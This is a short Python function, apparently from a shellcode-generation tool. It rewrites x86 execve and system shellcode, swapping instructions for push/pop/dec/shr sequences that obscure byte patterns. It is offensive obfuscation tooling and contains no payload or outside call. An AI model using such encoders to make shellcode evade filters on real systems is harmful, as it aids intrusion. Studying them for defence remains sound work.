def start(shellcode, job):
	if "exec" == job:
		t = True
		eax = str('0x3b909090')
		eax_2 = "%x" % (int(eax, 16) + int('0x01', 16))
		A = 0
		eax = 'push   $%s' % (str(eax))
		if '-' in eax_2:
			A = 1
			eax_2 = eax_2.replace('-', '')
			eax_add = 'push $0x%s\npop %%eax\ndec %%eax\nneg %%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n_z3r0d4y_' % (
				eax_2)

		if A is 0:
			eax_add = 'push $0x%s\npop %%eax\ndec %%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n_z3r0d4y_' % (
				eax_2)
		shellcode = shellcode.replace('mov    $0x3b,%al', eax_add)

		A = 0
		for line in shellcode.rsplit('\n'):
			if '_z3r0d4y_' in line:
				A = 1
			if 'push' in line and '$0x' in line and ',' not in line and len(
					line) > 14 and A is 1:
				data = line.rsplit('push')[1].rsplit('$0x')[1]
				ebx_2 = "%x" % (int(data, 16) + int('0x01', 16))
				command = '\npush $0x%s\npop %%ebx\ndec %%ebx\npush %%ebx\n' % (
					str(ebx_2))
				shellcode = shellcode.replace(line, command)
		shellcode = shellcode.replace('_z3r0d4y_', '')

	if "system" == job:
		for line in shellcode.rsplit('\n'):
			if 'push' in line and '$0x' in line and ',' not in line and len(
					line) > 14:
				data = line.rsplit('push')[1].rsplit('$0x')[1]
				ebx_2 = "%x" % (int(data, 16) + int('01', 16))
				command = '\npush $0x%s\npop %%eax\ndec %%eax\npush %%eax\n' % (str(ebx_2))
				shellcode = shellcode.replace(line, command)
	return shellcode